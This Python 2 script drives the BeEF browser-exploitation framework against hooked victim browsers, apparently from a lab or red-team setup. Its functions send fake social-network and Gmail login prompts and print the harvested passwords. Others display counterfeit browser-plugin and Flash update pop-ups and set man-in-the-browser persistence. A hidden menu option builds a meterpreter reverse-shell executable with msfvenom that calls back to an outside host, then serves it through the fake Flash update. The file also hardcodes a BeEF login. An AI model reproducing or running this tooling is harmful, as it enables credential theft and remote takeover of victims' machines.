import sys, os, time, requests, signal, json, pprint, sqlite3
from collections import MutableMapping
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from browser_db_router import *
from mitm_buffer import *


class Browser_Parser:


	def __init__(self):
		self.user_id = sys.argv[1:][0]
		print str(self.user_id)
		self.browser_db_router= Browser_DB_Router(self.user_id)
		self.uname = "beef"
		self.pword = "eaterGin308"
		self.cert_key = "/opt/beef/beefFramework-key.pem"
		self.cert_cert = "/opt/beef/beefFramework.pem"
		self.redirect_url = 'https://192.168.3.1/sheep.jpg'
		self.hook = 'https://192.168.3.1:3000/hook.js'
		self.exploit = None
		self.browser_id = None
		self.cert = (self.cert_cert, self.cert_key)
		self.api_key = self.get_api_key()
		self.login_promt_id = None
		self.account = None
		self.toolbar_prompt_id = None
		self.interface = MITM_Interface(self.user_id)
		self.lhost = "172.16.2.109"
		self.lport = "4444"
		self.menu()

	def get_api_key(self):
		hed = "Content-Type: application/json"
		to_beef_serv = {'username' : self.uname, 'password' : self.pword}
		k_une = requests.post(url="https://192.168.3.1:3000/api/admin/login", cert=self.cert, verify=False, json=to_beef_serv)
		k_dict = json.loads(k_une.text)
		return k_dict['token']

	def promt_fake_login(self):
		#if self.login_promt_id is None: ./RAP.sh st
		socnet_choice= raw_input("fake login to send:")
		if socnet_choice.lower() == 'facebook':
			socnet_choice, self.account = 'Facebook','facebook'
		elif socnet_choice.lower() == 'linkedin':
			socnet_choice, self.account = 'LinkedIn', 'linkedin'
		elif socnet_choice.lower() == 'youtube':
			socnet_choice, self.account = 'YouTube', "youtube"
		elif socnet_choice.lower() == 'generic':
			socnet_choice, self.account = 'Generic', "generic"
		else:
			print "please pick a social network"
			return None
		hed = "Content-Type: application/json; charset=UTF-8"
		to_beef_serv = {'choice': socnet_choice }
		k_une = requests.post(url="https://192.168.3.1:3000/api/modules/" + str(self.browser_id) +"/242?token=" + str(self.api_key), cert=self.cert, verify=False, json=to_beef_serv)
		k_dict = json.loads(k_une.text)
		if k_dict['success'] == "true":
			print "successfully sent prompt..."
			print "command id:" + str(k_dict['command_id'])
			self.login_promt_id = k_dict['command_id']
			self.browser_db_router.update_BrowserTable_Login_Cmd(self.user_id, self.login_promt_id)
		else:
			print "prompt request unsucessful"
			return None

	def prompt_gmail_login(self):
		self.account = "Google"
		hed = "Content-Type: application/json; charset=UTF-8"
		to_beef_serv = {'xss_hook_uri': self.hook, 'logout_gmail_interval' : 10000, 'wait_seconds_before_redirect':2000 }
		k_une = requests.post(url="https://192.168.3.1:3000/api/modules/" + str(self.browser_id) +"/262?token=" + str(self.api_key), cert=self.cert, verify=False, json=to_beef_serv)
		k_dict = json.loads(k_une.text)
		if k_dict['success'] == "true":
			print "successfully sent prompt..."
			print "command id:" + str(k_dict['command_id'])
			self.login_promt_id = k_dict['command_id']
			self.browser_db_router.update_BrowserTable_Login_Cmd(self.user_id, self.login_promt_id)
		else:
			print "prompt request unsucessful"
			return None


	def fake_flash_update(self, payload):
		if self.browser_id is None:
			print "find some browsers first"
			return None
		hed = "Content-Type: application/json; charset=UTF-8"
		params = {"image": "https://192.168.3.1:3000/adobe/flash_update.png",
					"payload": 'Custom_Payload',
					"payload_uri": payload}
		to_b = requests.post(url =  "https://192.168.3.1:3000/api/modules/" + str(self.browser_id) +"/249?token=" + str(self.api_key),cert=self.cert, verify=False, json=params)
		to_b = json.loads(to_b.text)
		if to_b['success'] == "true":
			print "fake flash pop-up sent..."
			print 'command_id:' + str(to_b['command_id'])
			self.toolbar_prompt_id = 249
			self.browser_db_router.update_BrowserTable_Toolbar_Cmd(self.user_id, str(to_b['command_id']))
		else:
			print "prompt request unsucessful"
			return None

	def man_in_the_browser(self):
		hed = "Content-Type: application/json; charset=UTF-8"
		params = {"man_in_the_browser": ""}
		to_b = requests.post(url =  "https://192.168.3.1:3000/api/modules/" + str(self.browser_id) +"/266?token=" + str(self.api_key),cert=self.cert, verify=False, json=params)
		to_b = json.loads(to_b.text)
		if to_b['success'] == "true":
			print "mitb persistence..."
		else:
			print "mitb request unsucessful"
			return None


	def make_meterpreter_payload(self, operating_system):
		'''
			android: android/meterpreter/reverse_tcp  
			windows : windows/meterpreter/reverse_tcp
			mac : osx/x86/shell_reverse_tcp    
		'''
		if operating_system.lower() == "windows":
			print "creating windows payload..."
			os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost=" + self.lhost + " lport=" + self.lport + " -f exe -o /var/www/html/update.exe")
			self.exploit = "https://192.168.3.1/update.exe"
		else:	
			print "please supply OS"
			pass

		



	def fake_toolbar(self, redirect_url):
		if self.browser_id is None:
			print "find some browsers first"
			return None
		toolbar_type = raw_input("toolbar to send:")
		if toolbar_type.lower() == 'firefox':
			command_id = 252
			notification = "An additional plug-in is required to display some elements on this page."
		elif toolbar_type.lower() == 'chrome':
			command_id = 256
			notification = "Additional plugins are required to display all the media on this page."
		elif toolbar_type.lower() == 'ie':
			command_id = 263
			notification = "This website wants to run the following applet: 'Java' from 'Microsoft Inc'. To continue using this website you must accept the following security popup"
		else:
			print 'please give a valid choice'
			return None
		hed = "Content-Type: application/json; charset=UTF-8"
		params= {"url" : self.redirect_url, 'notification_text' : notification}
		f_f = requests.post(url="https://192.168.3.1:3000/api/modules/" + str(self.browser_id) +"/" + str(command_id) + "?token=" + str(self.api_key), cert=self.cert, verify=False, json=params)
		f_f = json.loads(f_f.text)
		if f_f['success'] == "true":
			print "successfully sent prompt..."
			print "command id:" + str(f_f['command_id'])
			self.toolbar_prompt_id = command_id
			self.browser_db_router.update_BrowserTable_Toolbar_Cmd(self.user_id, str(f_f['command_id']))
		else:
			print "prompt request unsucessful"
			return None

	def get_prompt_credentials(self, account):
		if self.browser_id is None:
			print "find some browsers first"
			return None
		cmd_id = '/262/' if account.lower() == 'google' else '/242/'
		idee = self.browser_db_router.get_browser_login_cmd(self.user_id)
		command_id = self.browser_db_router.get_browser_session_id(self.user_id)
		dets = requests.get(url="https://192.168.3.1:3000/api/modules/" 
			+ str(self.browser_id) 
			+ cmd_id + str(idee) 
			+ "?token=" 
			+ str(self.api_key), cert = self.cert, verify=False)
		c_dict = json.loads(dets.text)
		try:
			pprint.pprint(c_dict)
			data = json.loads(c_dict['0']['data'])
			if not account.lower() == 'google':
				password = str(data['data']).split(":")[1]
			else:
				password = str(data['data']).split(":")[2]
			self.interface.read_traffic(account, password)
			print password
			return self.browser_db_router.update_BrowserTable_Login(self.user_id, 1)
		except KeyError:
			print("did not get response yet")
			return self.browser_db_router.update_BrowserTable_Login(self.user_id, 0)


	def get_toolbar_result(self):
		#if toolbar prompt id is none, return
		if self.toolbar_prompt_id is not None:
			idee = self.browser_db_router.get_browser_toolbar_cmd(self.user_id)
			print str(idee)
			self.browser_id = self.browser_db_router.get_browser_session_id(self.user_id)
			print str(self.browser_id)
			print(str("toolbar_prompt_id:" + str(self.toolbar_prompt_id)))
			dets = requests.get(url='https://192.168.3.1:3000/api/modules/'
				+ str(self.browser_id)
				+ '/' + str(self.toolbar_prompt_id) + '/' + str(idee)
				+"?token="
				+str(self.api_key), cert=self.cert, verify=False)
			c_dict= json.loads(dets.text)
			print c_dict
			try:
				if c_dict['1']:
					print "user has clicked on the toolbar"
					self.toolbar_prompt_id = None
					return self.browser_db_router.update_BrowserTable_Toolbar(self.user_id, 1)
			except KeyError as ke:
				try:
					if c_dict['0']:
						print "user has clicked on false flash pop-up"
						self.toolbar_prompt_id = None
						return self.browser_db_router.update_BrowserTable_Toolbar(self.user_id, 1)
				except KeyError as ke:
					print "user has not clicked on toolbar"
					return self.browser_db_router.update_BrowserTable_Toolbar(self.user_id, 0)
		else:
			print "plz issue toolbar cmd first"
			pass

	def get_hooked_browsers(self):
		hooked_browsers = {}
		urll = 'https://192.168.3.1:3000/api/hooks?token=' + str(self.api_key)
		k_une = requests.get(url=urll,  cert = self.cert, verify=False)
		k_dict = json.loads(k_une.text)
		if k_dict['hooked-browsers']['online']:
			print "found currently-hooked browser:"
			for key in k_dict['hooked-browsers']['online']['0']:
				if key == 'session':
					browser_id = k_dict['hooked-browsers']['online']['0']['session']
				elif key == 'page_uri':
					self.redirect_uri = k_dict['hooked-browsers']['online']['0']['page_uri']
				else:
					hooked_browsers[str(key)] = str(k_dict['hooked-browsers']['online']['0'][key])
			pprint.pprint(hooked_browsers)
			print "browser session id: " + str(browser_id)
			self.browser_id = browser_id
			self.browser_db_router.update_BrowserTable_Session_id(self.user_id, self.browser_id, self.redirect_uri)
			self.man_in_the_browser()
			return self.get_browser_deets(self.browser_id)
		else:
			print "no hooked browser found"
			return None

	def get_browser_deets(self, browser_id):
		urll = 'https://192.168.3.1:3000/api/hooks/' + str(browser_id) + "?token=" + str(self.api_key)
		k_une = requests.get(url=urll, cert=self.cert, verify=False)
		k_dict = json.loads(k_une.text)
		pprint.pprint(k_dict)
		self.browser_db_router.insert_into_BrowserTable(self.user_id, browser_id, k_dict['BrowserReportedName'], k_dict['BrowserVersion'], k_dict['OsName'], k_dict['BrowserPlugins'], self.browser_id, '0', '0', k_dict['PageURI'])


	def get_module_deets(self):
		#debug: helper to get details on modules, delete after use
		det = requests.get(url="https://192.168.3.1:3000/api/modules/266?token=" + str(self.api_key), cert=self.cert, verify=False)
		pprint.pprint(json.loads(det.text)) 
		# 242 --> pretty theft, 252 --> firefox fake notification, 256 --> chrome fake bar, 263 --> IE fake bar

	def menu(self):
			print("*****BROWSER ANALYZER*****")
			picd = True
			while picd:
				resp = input("please select an option number:\n" \
								"0.See browser DB\n" \
								"1.Save hooked browser details\n" \
								"2.Display fake login\n"\
								"3.Display fake toolbar\n"\
								"4.Save fake login results\n"\
								"5.Save fake toolbar results\n"\
								"6.Gmail theft\n"\
								"7.Flash pop-up\n"\
								"8.exit\n")
				try:
					resp = int(resp)
				except ValueError:
					pass
				if resp not in range(0,10) and resp != 666:
					pass
				else:
					picd = False
			if resp == 0:
				self.browser_db_router.show_browser_db(self.user_id)
				self.menu()
			elif resp == 1:
				self.get_hooked_browsers()
				self.menu()
			elif resp == 2:
				self.promt_fake_login()
				self.menu()
			elif resp == 3:
				self.fake_toolbar(self.redirect_url)
				self.menu()
			elif resp == 4:
				self.get_prompt_credentials(self.account) if self.account is not None else None
				self.menu()
			elif resp == 5:
				self.get_toolbar_result()
				self.menu()
			elif resp == 6:
				self.prompt_gmail_login()
				self.menu()
			elif resp == 7:
				self.fake_flash_update(self.redirect_url)
				self.menu()
			elif resp == 8:
				sys.exit()
			elif resp == 666:
				rusure = raw_input("[!] ARE YOU SURE YOU WANT TO DO THIS?")
				if rusure.lower() == "yes":
					self.make_meterpreter_payload("windows")
					self.fake_flash_update(self.exploit)
				self.menu()

if __name__ == "__main__":
	bp = Browser_Parser()
